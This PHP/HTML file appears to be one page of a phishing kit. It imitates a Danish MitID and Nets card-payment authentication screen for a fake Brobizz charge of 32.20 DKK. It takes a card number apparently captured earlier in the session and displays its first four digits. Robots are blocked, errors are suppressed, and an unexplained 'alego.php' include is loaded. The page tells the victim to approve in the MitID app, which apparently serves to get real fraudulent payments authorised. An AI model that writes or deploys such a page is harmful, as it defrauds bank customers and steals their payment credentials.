<?php
error_reporting(0);
date_default_timezone_set('Europe/Copenhagen');
session_start();

require '../includes/alego.php';
require '../config.php';

// Session validation - redirect if not active
if(!isset($_SESSION['active'])){
    header('Location: index.php');
    exit();
}

// Generate visitor ID if not exists
if(!isset($_SESSION['visitor_id'])){
    $visitorId = bin2hex(random_bytes(16));
    $_SESSION['visitor_id'] = $visitorId;
}

// Get card number from session and mask it
$card_number = $_SESSION['card_number'] ?? '';
$masked_card = '4571xxxxxxx'; // Default
if(!empty($card_number)){
    // Remove spaces and get first 4 digits
    $clean_card = str_replace(' ', '', $card_number);
    $first_four = substr($clean_card, 0, 4);
    $masked_card = $first_four . 'xxxxxxx';
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html lang="dk"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Authentication</title>
    <link rel="icon" type="image/x-icon" href="../assets/images/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="google" content="notranslate">

    <style>
        body {
            fullScreen: false;
            margin: 0;
            background: #f3f2f2;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 10px;
            min-width: 248px;
        }

        #mitidIframe {
            width: 100%;
            height: 260px;
            border: 0;
            z-index: 100;
            position: relative;
        }

        @media (min-width: 380px) {
            #mitidIframe {
                height: 227px;
            }
        }

        @media (min-width: 400px) {
            #mitidIframe {
                height: 350px;
            }
        }

        .mitidContextStr {
            font-size: 10px;
            font-weight: normal;
            color: #333;
            border-top: 1px solid #eee;
            border-bottom: 1px solid #eee;
            padding: 6px;
            background-color: #f8f8f9;
            overflow-wrap: anywhere;
        }

        @media (min-width: 380px) {
            .mitidContextStr {
                font-size: 0.9rem;
                padding: 15px;
            }
        }

        @media (min-width: 400px) {
            .mitidContextStr {
                font-size: 0.9rem;
                padding: 08px;
            }
        }

        [hidden] {
            display: none;
        }

        .header {
            height: 42px;
            border-bottom: 0px solid #ddd;
            display: flex;
            justify-content: flex-end;
            align-items: center;
            padding: 0px 16px 0px 16px;
        }

        .imgcon {
            width: 33%;
        }

        .logo {
            max-width: 100%;
            max-height: 32px;
        }

        .bank {
            float: right;
        }

        .lang {
            width: 30%;
            display: block;
            margin: auto;
            text-align: center;
        }

        .lang img {
            max-width: 20px;
            height: auto;
            width: 100%;
        }

        .lang a,
        .lang a:hover,
        .lang a:visited,
        .lang a:active {
            font-size: 2.5em;
            text-decoration: none;
        }

        .network {
            float: left;
        }

        .wrapper {
            -webkit-border-radius: 4px;
            -moz-border-radius: 4px;
            border-radius: 4px;
            position: relative;
            display: block;
            width: 250px;
            height: 400px;
            background-color: #fff;
        }

        .container {
            position: relative;
            display: flex;
            flex-direction: column;
            font-family: Arial, sans-serif;
            padding: 0px 16px
        }

        button {
            width: 30%;
            height: 34px;
            text-align: center;
            margin: 00px 1% 00px 1%;
            min-height: 24px;
            line-height: 24px;
            border-radius: 4px;
            border: 1px solid #ccc;
            font-size: 0.9em;
            color: #333;
            background-image: linear-gradient(#eee, #ddd);
        }

        button:hover {
            color: #fff;
            background-image: linear-gradient(#96bfe9, #5e99d4);
        }

        button img {
            display: inline-block;
            vertical-align: middle;
            width: 12px;
        }

        .buttons {
            margin-top: 6px;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: row-reverse;
        }

        @media (min-width: 380px) {
            body {
                font-size: 11px;
            }

            .wrapper {
                width: 380px;
                height: 415px;
            }

            .header {
                height: 72px;
                display: flex;
                justify-content: flex-center;
                align-items: center;
            }

            .container {
                padding: 0px 20px;
            }

            .logo {
                max-width: 100%;
                max-height: 60px;
            }

            .lang img {
                max-width: 40px;
            }

            button {
                min-height: 30px;
                line-height: 30px;
            }
        }

        @media (min-width: 400px) {
            body {
                font-size: 14px;
            }

            .wrapper {
                width: 380px;
                height: 550px;
            }

            .header {
                height: 72px;
                display: flex;
                justify-content: flex-center;
                align-items: center;
            }

            .container {
                padding: 0px 20px;
            }

            .logo {
                max-width: 100%;
                max-height: 60px;
            }

            .lang img {
                max-width: 40px;
            }

            button {
                min-height: 30px;
                line-height: 30px;
            }
        }

        body,
        html {
            margin: 0;
            padding: 0;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container1 {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
            width: 100%;
        }

        .code-app-emulator {
            width: 210px;
            height: auto;
        }
    </style>

</head>

<body>
    <section class="wrapper">
        <header class="header">
            <div class="imgcon"><img src="../assets/images/Nets_logo.svg" alt="Your Bank" class="logo network"></div>
            <div class="imgcon">
                <div class="lang lane">
                    <a href="#"><img src="../assets/images/en.svg"></a>
                </div>
            </div>
            <div class="imgcon"><img src="../assets/images/1.svg" alt="Card Network" class="logo bank"></div>
        </header>

        <section class="container" style="padding: 0px; flex: auto">

            <section>
                <div class="mitidContextStr">
                    Betal 32.20 DKK til Brobizz A/S - fra kort <?php echo $masked_card; ?>
                    <input type="hidden" name="e" value="1">
                </div>
            </section>

            <section class="mitidContainer">
                <div style="display:none;" id="mitid_parameters">7a2f8e6a-5a1c-4de4-ba69-d11305a3b8ac</div>
                <br>
                <p id="mitId" style="font-weight: bold; font-size: 20px; text-align: center;">Åbn MitID app og godkend</p>

                <div class="container1">
                    <object type="image/svg+xml" id="code-app-emulator" class="code-app-emulator" data="../assets/images/code-app-slider-emulator.svg">
                        <img alt="code-app-emulator" class="code-app-emulator" src="../assets/images/code-app-slider-emulator.svg">
                    </object>
                </div>
                
                <br>
                <br>
                <br>
                <br>

            </section>

            <section style="border-top: 1px solid #eee;">
                <div class="buttons">
                    <button type="submit" id="smspasswd" name="smspasswd" value="smspasswd">
                        SMS+kode
                    </button>
                    <button type="submit" id="cancel" name="cancel" value="cancel"><img src="../assets/images/back.png" alt="cancel">
                        Afbryd
                    </button>
                </div>
            </section>
        </section>

    </section>
    
    <script>
        // Auth is the final step - no auto-redirect
        // User stays here for authentication
    </script>
</body>
</html>
